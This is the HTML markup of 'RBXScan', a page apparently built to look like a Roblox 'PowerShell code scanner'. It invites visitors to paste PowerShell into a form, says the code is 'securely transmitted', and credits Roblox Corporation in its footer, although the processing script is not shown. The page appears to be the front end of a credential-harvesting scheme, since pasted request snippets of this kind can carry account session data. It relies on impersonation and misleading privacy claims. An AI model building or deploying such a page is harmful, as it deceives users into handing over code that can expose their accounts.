<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RBXScan</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <!-- Dark Mode Toggle -->
    <button class="dark-mode-toggle" id="darkModeToggle">üåô Dark Mode</button>
    
    <div class="container">
        <div class="roblox-logo">
            <div class="roblox-icon"></div>
            <div class="logo">RBXScan</div>
        </div>
        <div class="subtitle">Advanced Code Scanner</div>
        
        <div class="scan-section">
            <button type="button" class="submit-btn" id="openScanBtn">
                üîç Scan Code
            </button>
        </div>
        
        <div id="statusMessage" class="status-message"></div>
        
        <div id="mainLoadingContainer" class="loading-container">
            <div class="loading-dots-visual">
                <div class="loading-dot"></div>
                <div class="loading-dot"></div>
                <div class="loading-dot"></div>
            </div>
            <div class="loading-text">
                Scanning PowerShell<span class="loading-text-dots"></span>
            </div>
        </div>
        
        <div class="security-note">
            üîí RBXScan securely transmits your code with full privacy protection
        </div>
    </div>

    <!-- Scan Popup -->
    <div id="compilePopup" class="popup-overlay">
        <div class="popup-content">
            <div class="popup-title">üîç RBXScan Scanner</div>
            <form id="compileForm">
                <textarea 
                    id="codeTextarea" 
                    class="code-textarea" 
                    placeholder="Insert PowerShell here to scan...&#10;&#10;-- Example:&#10;Get-Process&#10;Write-Host 'PowerShell Scanner Active'"
                    required
                    spellcheck="false"
                ></textarea>
                
                <div class="popup-buttons">
                    <button type="button" class="close-btn" id="closePopup">Cancel</button>
                    <button type="submit" class="submit-btn" id="compileSubmitBtn">
                        üöÄ Start Scanning
                    </button>
                </div>
            </form>
            
            <div id="compileStatusMessage" class="status-message"></div>
            
            <div id="loadingContainer" class="loading-container">
                <div class="loading-dots-visual">
                    <div class="loading-dot"></div>
                    <div class="loading-dot"></div>
                    <div class="loading-dot"></div>
                </div>
                <div class="loading-text">
                    Scanning PowerShell<span class="loading-text-dots"></span>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        ¬© 2025 All rights reserved to Roblox Corporation
    </div>

    <script src="script.js"></script>
</body>
</html>
